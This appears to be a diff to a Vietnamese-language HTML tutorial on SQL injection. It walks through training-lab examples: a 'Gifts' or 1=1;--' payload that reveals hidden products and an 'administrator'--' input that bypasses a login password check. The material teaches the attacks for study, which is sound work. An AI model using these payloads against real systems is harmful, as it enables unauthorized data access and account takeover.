@@ -37,15 +37,22 @@
 </table>
 
   <h3>1.2. Retrieving hidden data</h3>
-  <p>Trong web, khi user chọn category Gifts, URL gọi:</p>
+  <p><b>Bối cảnh:</b> Web dùng URL nhận category từ user</p>
   <pre>https://insecure-website.com/products?category=Gifts</pre>
-  <p>Ứng dụng tạo SQL:</p>
+  <p> và dùng câu SQL sau kiểm tra các sản phẩm đã được phát hành (<code>released=1</code>). Nếu sản phẩm chưa được phát hành thì bị ẩn đi (<code>release=0</code>).</p>
   <pre>SELECT * FROM products 
 WHERE category = 'Gifts' AND released = 1;</pre>
-  <p>Chỉ sản phẩm Gifts nào có <code>released = 1</code> mới được hiển thị trên web.</p>
   <p>Nếu muốn xem những sản phẩm có <code>released = 0</code> (hoặc tất cả), ta nhập payload sau vào URL:</p>
   <pre>...category=Gifts' or 1=1;--</pre>
   <p>SQL trở thành:</p>
   <pre>SELECT * FROM products 
 WHERE category = 'Gifts' or 1=1;--' AND released = 1;</pre>
   <p>Phần sau <code>--</code>: <code>' AND released = 1;</code> bị biến thành comment.</p>
+
+
+  <h3>1.3. Simple Login Bypass</h3>
+  <p><b>Bối cảnh:</b> Web sử dụng câu query sau để kiểm tra username và password của user.</p>
+  <pre>SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'</pre>
+  <p>Nếu muốn log in as admin ta có thể inject vào username như sau:</p>
+  <pre>SELECT * FROM users WHERE username = '<b>administrator'--</b>' AND password = 'bluecheese'</pre>
+  <p>Khi đó phần query kiểm tra pass phía sau <code>' AND password = ''</code> sẽ bị vô hiệu hóa.</p>
